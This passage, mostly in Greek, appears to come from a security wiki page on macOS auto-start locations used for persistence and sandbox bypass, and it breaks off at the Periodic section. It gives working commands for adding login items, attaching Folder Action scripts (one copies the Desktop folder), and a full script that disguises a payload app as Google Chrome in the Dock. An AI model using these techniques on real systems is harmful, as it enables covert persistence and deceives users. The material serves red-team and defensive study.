- `???`

Επιτρέπει τη δημιουργία workflows που μπορούν να εκτελέσουν κώδικα όταν πληρούνται ορισμένες προϋποθέσεις. Ενδεχομένως ένας επιτιθέμενος μπορεί να δημιουργήσει ένα αρχείο workflow και να αναγκάσει το Alfred να το φορτώσει (απαιτείται να πληρώσετε την premium έκδοση για να χρησιμοποιήσετε workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Όμως το ssh πρέπει να είναι ενεργοποιημένο και να χρησιμοποιείται
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Το SSH χρησιμοποιείται για πρόσβαση Full-Disk

#### Τοποθεσία

- **`~/.ssh/rc`**
- **Trigger**: Είσοδος μέσω ssh
- **`/etc/ssh/sshrc`**
- Απαιτείται root
- **Trigger**: Είσοδος μέσω ssh

> [!CAUTION]
> Για να ενεργοποιήσετε το ssh απαιτεί Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Περιγραφή & Εκμετάλλευση

Προεπιλεγμένα, εκτός αν το `PermitUserRC no` στο `/etc/ssh/sshd_config`, όταν ένας χρήστης **συνδέεται μέσω SSH** τα scripts **`/etc/ssh/sshrc`** και **`~/.ssh/rc`** θα εκτελεστούν.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Όμως χρειάζεται να εκτελέσετε `osascript` με args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Είσοδος
- Το exploit payload αποθηκεύεται καλώντας **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Είσοδος
- Απαιτείται root

#### Περιγραφή

Στις System Preferences -> Users & Groups -> **Login Items** μπορείτε να βρείτε **στοιχεία που εκτελούνται όταν ο χρήστης συνδέεται**.\
Είναι δυνατό να τα απαριθμήσετε, να τα προσθέσετε και να τα αφαιρέσετε από τη γραμμή εντολών:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Αυτά τα αντικείμενα αποθηκεύονται στο αρχείο **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** μπορούν **επίσης** να υποδειχθούν χρησιμοποιώντας την API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) η οποία θα αποθηκεύσει τη διαμόρφωση στο **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP ως Login Item

(Ελέγξτε την προηγούμενη ενότητα για Login Items, αυτό είναι επέκταση)

Αν αποθηκεύσετε ένα **ZIP** αρχείο ως **Login Item**, το **`Archive Utility`** θα το ανοίξει και αν το zip για παράδειγμα ήταν αποθηκευμένο σε **`~/Library`** και περιείχε τον φάκελο **`LaunchAgents/file.plist`** με ένα backdoor, αυτός ο φάκελος θα δημιουργηθεί (δεν δημιουργείται από προεπιλογή) και το plist θα προστεθεί, έτσι την επόμενη φορά που ο χρήστης θα συνδεθεί ξανά, το **backdoor που υποδεικνύεται στο plist θα εκτελεστεί**.

Μια άλλη επιλογή θα ήταν να δημιουργήσετε τα αρχεία **`.bash_profile`** και **`.zshenv`** μέσα στο HOME του χρήστη έτσι ώστε αν ο φάκελος LaunchAgents υπάρχει ήδη αυτή η τεχνική να εξακολουθεί να λειτουργεί.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Αλλά χρειάζεται να **εκτελέσετε** **`at`** και πρέπει να είναι **ενεργοποιημένο**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Χρειάζεται να **εκτελέσετε** **`at`** και πρέπει να είναι **ενεργοποιημένο**

#### **Περιγραφή**

`at` tasks έχουν σχεδιαστεί για τον προγραμματισμό εργασιών μίας φοράς που θα εκτελούνται σε συγκεκριμένες χρονικές στιγμές. Σε αντίθεση με τα cron jobs, τα `at` tasks αφαιρούνται αυτόματα μετά την εκτέλεση. Είναι σημαντικό να σημειωθεί ότι αυτές οι εργασίες παραμένουν μετά από επανεκκινήσεις του συστήματος, καθιστώντας τες πιθανές ανησυχίες ασφάλειας υπό ορισμένες συνθήκες.

Από **προεπιλογή** είναι **απενεργοποιημένα** αλλά ο χρήστης **root** μπορεί να **τα ενεργοποιήσει** με:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Αυτό θα δημιουργήσει ένα αρχείο σε 1 ώρα:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Ελέγξτε την ουρά εργασιών χρησιμοποιώντας `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Παραπάνω βλέπουμε δύο προγραμματισμένες εργασίες. Μπορούμε να εκτυπώσουμε τις λεπτομέρειες της εργασίας χρησιμοποιώντας `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Εάν οι εργασίες AT δεν είναι ενεργοποιημένες, οι δημιουργημένες εργασίες δεν θα εκτελεστούν.

Τα **αρχεία εργασιών** βρίσκονται στο `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Το όνομα του αρχείου περιέχει την ουρά, τον αριθμό της εργασίας και την ώρα που έχει προγραμματιστεί να τρέξει. Για παράδειγμα ας ρίξουμε μια ματιά στο `a0001a019bdcd2`.

- `a` - αυτή είναι η ουρά
- `0001a` - αριθμός εργασίας σε hex, `0x1a = 26`
- `019bdcd2` - χρόνος σε hex. Αντιπροσωπεύει τα λεπτά που πέρασαν από το epoch. `0x019bdcd2` είναι `26991826` σε δεκαδικό. Αν το πολλαπλασιάσουμε με 60 παίρνουμε `1619509560`, που είναι `GMT: 2021. April 27., Tuesday 7:46:00`.

Αν εκτυπώσουμε το αρχείο εργασίας, θα δούμε ότι περιέχει τις ίδιες πληροφορίες που πήραμε με `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Αλλά χρειάζεται να μπορείτε να καλέσετε `osascript` με ορίσματα για να επικοινωνήσετε με **`System Events`** ώστε να μπορείτε να διαμορφώσετε Folder Actions
- Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Έχει μερικές βασικές TCC άδειες όπως Desktop, Documents και Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root required
- **Trigger**: Πρόσβαση στον καθορισμένο φάκελο
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Πρόσβαση στον καθορισμένο φάκελο

#### Description & Exploitation

Folder Actions είναι σενάρια που ενεργοποιούνται αυτόματα από αλλαγές σε έναν φάκελο, όπως η προσθήκη ή η αφαίρεση αντικειμένων, ή άλλες ενέργειες όπως το άνοιγμα ή η αλλαγή μεγέθους του παραθύρου του φακέλου. Αυτές οι ενέργειες μπορούν να χρησιμοποιηθούν για διάφορες εργασίες και μπορούν να ενεργοποιηθούν με διαφορετικούς τρόπους, όπως μέσω του Finder UI ή εντολών τερματικού.

Για να ρυθμίσετε Folder Actions, έχετε επιλογές όπως:

1. Δημιουργία ενός Folder Action workflow με [Automator](https://support.apple.com/guide/automator/welcome/mac) και εγκατάστασή του ως service.
2. Επισύναψη ενός script χειροκίνητα μέσω του Folder Actions Setup στο context menu ενός φακέλου.
3. Χρήση OSAScript για να στείλετε Apple Event μηνύματα στο `System Events.app` για προγραμματιστική ρύθμιση ενός Folder Action.
- Αυτή η μέθοδος είναι ιδιαίτερα χρήσιμη για την ενσωμάτωση της ενέργειας στο σύστημα, προσφέροντας επίπεδο επιμονής.

Το ακόλουθο script είναι ένα παράδειγμα του τι μπορεί να εκτελεστεί από ένα Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Για να κάνετε το παραπάνω script συμβατό με τα Folder Actions, κάντε compile χρησιμοποιώντας:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Αφού το script μεταγλωττιστεί, ρυθμίστε τα Folder Actions εκτελώντας το παρακάτω script. Αυτό το script θα ενεργοποιήσει τα Folder Actions παγκοσμίως και θα συνημάνει συγκεκριμένα το προηγουμένως μεταγλωττισμένο script στον φάκελο Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Εκτελέστε το setup script με:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Αυτός είναι ο τρόπος για να υλοποιήσετε αυτή τη persistence μέσω GUI:

Αυτό είναι το script που θα εκτελεστεί:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Μεταγλωττίστε το με: `osacompile -l JavaScript -o folder.scpt source.js`

Μετακινήστε το στο:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Στη συνέχεια, άνοιξε την εφαρμογή `Folder Actions Setup`, επίλεξε τον φάκελο που θέλεις να παρακολουθείς και διάλεξε στην περίπτωσή σου **`folder.scpt`** (στη δική μου περίπτωση το ονόμασα output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Τώρα, αν ανοίξεις αυτόν τον φάκελο με το **Finder**, το script σου θα εκτελεστεί.

Αυτή η ρύθμιση αποθηκεύτηκε στο **plist** που βρίσκεται στο **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** σε μορφή base64.

Τώρα, ας προσπαθήσουμε να προετοιμάσουμε αυτή την persistence χωρίς πρόσβαση σε GUI:

1. **Αντέγραψε το `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** στο `/tmp` για backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Αφαίρεσε** τις Folder Actions που μόλις όρισες:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Τώρα που έχουμε ένα κενό περιβάλλον

3. Αντέγραψε το αντίγραφο ασφαλείας: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Άνοιξε το Folder Actions Setup.app για να φορτωθεί αυτή η ρύθμιση: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Και αυτό δεν δούλεψε για μένα, αλλά αυτές είναι οι οδηγίες από το writeup:(

### Συντομεύσεις Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Χρήσιμο για να παρακάμψεις το sandbox: [✅](https://emojipedia.org/check-mark-button)
- Αλλά πρέπει να έχεις εγκαταστήσει μια κακόβουλη εφαρμογή στο σύστημα
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Όταν ο χρήστης κάνει κλικ στην εφαρμογή μέσα στο Dock

#### Περιγραφή & Εκμετάλλευση

Όλες οι εφαρμογές που εμφανίζονται στο Dock καθορίζονται μέσα στο plist: **`~/Library/Preferences/com.apple.dock.plist`**

Είναι δυνατό να **προσθέσεις μια εφαρμογή** απλά με:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Χρησιμοποιώντας λίγη **social engineering** θα μπορούσατε να **impersonate for example Google Chrome** στο dock και πραγματικά να εκτελέσετε το δικό σας script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Μια πολύ συγκεκριμένη ενέργεια πρέπει να συμβεί
- Θα καταλήξετε σε άλλο sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Απαιτείται root
- Trigger: Use the color picker
- `~/Library/ColorPickers`
- Trigger: Use the color picker

#### Description & Exploit

**Compile a color picker** bundle με τον κώδικά σας (μπορείτε να χρησιμοποιήσετε [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) και προσθέστε έναν constructor (όπως στην [Screen Saver section](macos-auto-start-locations.md#screen-saver)) και αντιγράψτε το bundle στο `~/Library/ColorPickers`.

Τότε, όταν ο color picker ενεργοποιηθεί, ο κώδικάς σας θα τρέξει επίσης.

Σημειώστε ότι το binary που φορτώνει τη βιβλιοθήκη σας έχει ένα **πολύ περιοριστικό sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **Όχι, επειδή χρειάζεται να εκτελέσετε τη δική σας εφαρμογή**
- TCC bypass: ???

#### Τοποθεσία

- Μια συγκεκριμένη εφαρμογή

#### Περιγραφή & Εκμετάλλευση

Ένα παράδειγμα εφαρμογής με μια Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Οι εφαρμογές μπορούν να έχουν `Finder Sync Extensions`. Αυτή η επέκταση θα μπει μέσα σε μια εφαρμογή που θα εκτελεστεί. Επιπλέον, για να μπορέσει η επέκταση να εκτελέσει τον κώδικά της, **πρέπει να είναι υπογεγραμμένη** με κάποιο έγκυρο Apple developer certificate, πρέπει να είναι **sandboxed** (αν και μπορούν να προστεθούν πιο χαλαρές εξαιρέσεις) και πρέπει να είναι εγγεγραμμένη με κάτι σαν:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά θα καταλήξετε σε ένα κοινό sandbox εφαρμογής
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Απαιτείται root
- **Ενεργοποίηση**: Επιλέξτε το screen saver
- `/Library/Screen Savers`
- Απαιτείται root
- **Ενεργοποίηση**: Επιλέξτε το screen saver
- `~/Library/Screen Savers`
- **Ενεργοποίηση**: Επιλέξτε το screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Περιγραφή & Εκμετάλλευση

Δημιουργήστε ένα νέο project στο Xcode και επιλέξτε το template για να δημιουργήσετε ένα νέο **Screen Saver**. Έπειτα, προσθέστε τον κώδικά σας σε αυτό — για παράδειγμα τον ακόλουθο κώδικα για να δημιουργήσετε logs.

**Build** το, και αντιγράψτε το `.saver` bundle στο **`~/Library/Screen Savers`**. Έπειτα, ανοίξτε το Screen Saver GUI και αν απλώς κάνετε κλικ πάνω του, θα πρέπει να δημιουργήσει πολλά logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Σημειώστε ότι επειδή μέσα στα entitlements του binary που φορτώνει αυτόν τον κώδικα (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) μπορείτε να βρείτε **`com.apple.security.app-sandbox`** θα βρεθείτε **μέσα στο κοινό application sandbox**.

Κώδικας Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins του Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Όμως θα καταλήξετε σε sandbox εφαρμογής
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Το sandbox φαίνεται πολύ περιορισμένο

#### Location

- `~/Library/Spotlight/`
- **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το plugin του Spotlight.
- `/Library/Spotlight/`
- **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το plugin του Spotlight.
- Απαιτείται root
- `/System/Library/Spotlight/`
- **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το plugin του Spotlight.
- Απαιτείται root
- `Some.app/Contents/Library/Spotlight/`
- **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με επέκταση που διαχειρίζεται το plugin του Spotlight.
- Απαιτείται νέα εφαρμογή

#### Description & Exploitation

Spotlight είναι η ενσωματωμένη λειτουργία αναζήτησης του macOS, σχεδιασμένη να παρέχει στους χρήστες **γρήγορη και ολοκληρωμένη πρόσβαση στα δεδομένα του υπολογιστή τους**.\
Για να διευκολύνει αυτή την ταχεία δυνατότητα αναζήτησης, το Spotlight διατηρεί μια **ιδιόκτητη βάση δεδομένων** και δημιουργεί ένα ευρετήριο αναλύοντας τα περισσότερα αρχεία, επιτρέποντας γρήγορες αναζητήσεις τόσο στα ονόματα αρχείων όσο και στο περιεχόμενό τους.

Ο υποκείμενος μηχανισμός του Spotlight περιλαμβάνει μια κεντρική διεργασία με το όνομα 'mds', που σημαίνει **'metadata server'.** Αυτή η διεργασία συντονίζει ολόκληρη την υπηρεσία Spotlight. Συμπληρωματικά, υπάρχουν πολλοί δαίμονες 'mdworker' που εκτελούν διάφορες συντήρητικές εργασίες, όπως το ευρετηρίασμα διαφορετικών τύπων αρχείων (`ps -ef | grep mdworker`). Αυτές οι εργασίες καθίστανται δυνατές μέσω Spotlight importer plugins, ή **`.mdimporter` bundles**, που επιτρέπουν στο Spotlight να κατανοεί και να ευρετηριάζει περιεχόμενο σε μια ποικιλία μορφών αρχείων.

Τα plugins ή τα **`.mdimporter`** bundles βρίσκονται στις θέσεις που αναφέρθηκαν προηγουμένως και αν εμφανιστεί ένα νέο bundle φορτώνεται μέσα σε ένα λεπτό (δεν χρειάζεται επανεκκίνηση κάποιας υπηρεσίας). Αυτά τα bundles πρέπει να υποδεικνύουν ποιόν **τύπο αρχείου και ποιες επεκτάσεις μπορούν να διαχειριστούν**, έτσι το Spotlight θα τα χρησιμοποιεί όταν δημιουργείται ένα νέο αρχείο με την υποδεικνυόμενη επέκταση.

Είναι δυνατό να **βρείτε όλα τα `mdimporters`** που έχουν φορτωθεί τρέχοντας:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Και για παράδειγμα **/Library/Spotlight/iBooksAuthor.mdimporter** χρησιμοποιείται για την ανάλυση αυτού του τύπου αρχείων (επεκτάσεις `.iba` και `.book` μεταξύ άλλων):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Αν ελέγξετε το Plist άλλων `mdimporter` ίσως να μην βρείτε την εγγραφή **`UTTypeConformsTo`**. Αυτό συμβαίνει επειδή πρόκειται για ενσωματωμένο _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) και δεν χρειάζεται να καθορίσει επεκτάσεις.
>
> Επιπλέον, τα System default plugins έχουν πάντα προτεραιότητα, οπότε ένας επιτιθέμενος μπορεί να αποκτήσει πρόσβαση μόνο σε αρχεία που δεν ευρετηριάζονται ήδη από τα δικά της `mdimporters`.

Για να δημιουργήσετε το δικό σας importer μπορείτε να ξεκινήσετε με αυτό το project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) και μετά να αλλάξετε το όνομα, τα **`CFBundleDocumentTypes`** και να προσθέσετε **`UTImportedTypeDeclarations`** ώστε να υποστηρίζει την επέκταση που θέλετε και να τα αντικατοπτρίσετε στο **`schema.xml`**.\
Στη συνέχεια **αλλάξτε** τον κώδικα της συνάρτησης **`GetMetadataForFile`** ώστε να εκτελείται το payload σας όταν δημιουργείται ένα αρχείο με την επεξεργασμένη επέκταση.

Τέλος **συναρμολογήστε και αντιγράψτε το νέο σας `.mdimporter`** σε μία από τις προηγούμενες τοποθεσίες και μπορείτε να ελέγξετε πότε φορτώνεται **παρακολουθώντας τα logs** ή ελέγχοντας **`mdimport -L`**.

### ~~Preference Pane~~

> [!CAUTION]
> Φαίνεται πως αυτό δεν λειτουργεί πια.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Χρειάζεται συγκεκριμένη ενέργεια χρήστη
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Περιγραφή

Φαίνεται πως αυτό δεν λειτουργεί πια.

## Root Sandbox Bypass

> [!TIP]
> Εδώ θα βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass** που σας επιτρέπουν απλά να εκτελέσετε κάτι γράφοντάς το σε ένα αρχείο ενώ είστε **root** και/ή απαιτώντας άλλες **παράξενες συνθήκες.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά χρειάζεστε root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Απαιτείται root
- **Trigger**: Όταν έρθει η ώρα
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Απαιτείται root
- **Trigger**: Όταν έρθει η ώρα

#### Περιγραφή & Εκμετάλλευση

